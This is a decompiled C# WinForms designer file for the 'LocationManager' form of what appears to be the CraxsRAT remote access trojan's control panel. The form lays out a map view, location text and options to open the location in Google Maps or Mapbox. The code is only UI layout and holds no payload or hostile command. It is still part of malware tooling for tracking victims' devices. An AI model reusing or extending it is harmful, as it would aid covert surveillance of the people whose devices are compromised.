namespace Craxs_Rat
{
	// Token: 0x020000DA RID: 218
	[global::Microsoft.VisualBasic.CompilerServices.DesignerGenerated]
	public partial class LocationManager : global::System.Windows.Forms.Form
	{
		// Token: 0x06001074 RID: 4212 RVA: 0x000AE51C File Offset: 0x000AC71C
		protected override void Dispose(bool disposing)
		{
			try
			{
				if (disposing && this.components != null)
				{
					((global::System.IDisposable)this.components).Dispose();
				}
			}
			finally
			{
				base.Dispose(disposing);
			}
		}

		// Token: 0x06001075 RID: 4213 RVA: 0x000AE560 File Offset: 0x000AC760
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			this.Map = new global::System.Windows.Forms.PictureBox();
			this.ProgressBar1 = new global::System.Windows.Forms.ProgressBar();
			this.TOpacity = new global::System.Windows.Forms.Timer(this.components);
			this.ctxMenu = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.SaveToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.SaveAsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OpenUsingGoogleMapsToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.OpenUsingMapBoxToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.Panel1 = new global::System.Windows.Forms.Panel();
			this.TextBox1 = new global::System.Windows.Forms.TextBox();
			this.Panel2 = new global::System.Windows.Forms.Panel();
			this.DrakeUICheckBox1 = new global::DrakeUI.Framework.DrakeUICheckBox();
			this.savetimer = new global::System.Windows.Forms.Timer(this.components);
			((global::System.ComponentModel.ISupportInitialize)this.Map).BeginInit();
			this.ctxMenu.SuspendLayout();
			this.Panel1.SuspendLayout();
			this.Panel2.SuspendLayout();
			base.SuspendLayout();
			this.Map.BackColor = global::System.Drawing.Color.Black;
			this.Map.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.Map.Location = new global::System.Drawing.Point(0, 0);
			this.Map.Name = "Map";
			this.Map.Size = new global::System.Drawing.Size(434, 354);
			this.Map.TabIndex = 0;
			this.Map.TabStop = false;
			this.ProgressBar1.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.ProgressBar1.Location = new global::System.Drawing.Point(0, 354);
			this.ProgressBar1.Name = "ProgressBar1";
			this.ProgressBar1.Size = new global::System.Drawing.Size(574, 10);
			this.ProgressBar1.TabIndex = 1;
			this.TOpacity.Interval = 1;
			this.ctxMenu.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.SaveToolStripMenuItem,
				this.SaveAsToolStripMenuItem,
				this.OpenUsingGoogleMapsToolStripMenuItem,
				this.OpenUsingMapBoxToolStripMenuItem
			});
			this.ctxMenu.Name = "ctxMenu";
			this.ctxMenu.ShowImageMargin = false;
			this.ctxMenu.Size = new global::System.Drawing.Size(184, 92);
			this.SaveToolStripMenuItem.Name = "SaveToolStripMenuItem";
			this.SaveToolStripMenuItem.Size = new global::System.Drawing.Size(183, 22);
			this.SaveToolStripMenuItem.Text = "Save";
			this.SaveToolStripMenuItem.Visible = false;
			this.SaveAsToolStripMenuItem.Name = "SaveAsToolStripMenuItem";
			this.SaveAsToolStripMenuItem.Size = new global::System.Drawing.Size(183, 22);
			this.SaveAsToolStripMenuItem.Text = "Save As";
			this.SaveAsToolStripMenuItem.Visible = false;
			this.OpenUsingGoogleMapsToolStripMenuItem.Name = "OpenUsingGoogleMapsToolStripMenuItem";
			this.OpenUsingGoogleMapsToolStripMenuItem.Size = new global::System.Drawing.Size(183, 22);
			this.OpenUsingGoogleMapsToolStripMenuItem.Text = "Open using Google Maps";
			this.OpenUsingMapBoxToolStripMenuItem.Name = "OpenUsingMapBoxToolStripMenuItem";
			this.OpenUsingMapBoxToolStripMenuItem.Size = new global::System.Drawing.Size(183, 22);
			this.OpenUsingMapBoxToolStripMenuItem.Text = "Open using Mapbox";
			this.Panel1.BackColor = global::System.Drawing.Color.FromArgb(10, 10, 10);
			this.Panel1.Controls.Add(this.TextBox1);
			this.Panel1.Controls.Add(this.Panel2);
			this.Panel1.Dock = global::System.Windows.Forms.DockStyle.Right;
			this.Panel1.Location = new global::System.Drawing.Point(434, 0);
			this.Panel1.Name = "Panel1";
			this.Panel1.Size = new global::System.Drawing.Size(140, 354);
			this.Panel1.TabIndex = 2;
			this.TextBox1.BackColor = global::System.Drawing.Color.FromArgb(5, 5, 5);
			this.TextBox1.Dock = global::System.Windows.Forms.DockStyle.Fill;
			this.TextBox1.Font = new global::System.Drawing.Font("Roboto", 9f, global::System.Drawing.FontStyle.Bold);
			this.TextBox1.ForeColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.TextBox1.Location = new global::System.Drawing.Point(0, 0);
			this.TextBox1.Multiline = true;
			this.TextBox1.Name = "TextBox1";
			this.TextBox1.ReadOnly = true;
			this.TextBox1.Size = new global::System.Drawing.Size(140, 314);
			this.TextBox1.TabIndex = 0;
			this.Panel2.Controls.Add(this.DrakeUICheckBox1);
			this.Panel2.Dock = global::System.Windows.Forms.DockStyle.Bottom;
			this.Panel2.Location = new global::System.Drawing.Point(0, 314);
			this.Panel2.Name = "Panel2";
			this.Panel2.Size = new global::System.Drawing.Size(140, 40);
			this.Panel2.TabIndex = 3;
			this.DrakeUICheckBox1.CheckBoxColor = global::System.Drawing.Color.FromArgb(157, 5, 17);
			this.DrakeUICheckBox1.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.DrakeUICheckBox1.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 12f);
			this.DrakeUICheckBox1.ForeColor = global::System.Drawing.Color.White;
			this.DrakeUICheckBox1.Location = new global::System.Drawing.Point(39, 6);
			this.DrakeUICheckBox1.Name = "DrakeUICheckBox1";
			this.DrakeUICheckBox1.Padding = new global::System.Windows.Forms.Padding(22, 0, 0, 0);
			this.DrakeUICheckBox1.Size = new global::System.Drawing.Size(69, 29);
			this.DrakeUICheckBox1.Style = global::DrakeUI.Framework.UIStyle.Custom;
			this.DrakeUICheckBox1.TabIndex = 0;
			this.DrakeUICheckBox1.Text = "Save";
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			base.ClientSize = new global::System.Drawing.Size(574, 364);
			base.Controls.Add(this.Map);
			base.Controls.Add(this.Panel1);
			base.Controls.Add(this.ProgressBar1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.FixedSingle;
			base.MaximizeBox = false;
			this.MaximumSize = new global::System.Drawing.Size(590, 403);
			base.Name = "LocationManager";
			base.Opacity = 0.0;
			base.ShowIcon = false;
			this.Text = "LocationManager";
			((global::System.ComponentModel.ISupportInitialize)this.Map).EndInit();
			this.ctxMenu.ResumeLayout(false);
			this.Panel1.ResumeLayout(false);
			this.Panel1.PerformLayout();
			this.Panel2.ResumeLayout(false);
			base.ResumeLayout(false);
		}

		// Token: 0x040008F2 RID: 2290
		private global::System.ComponentModel.Container components;
	}
}
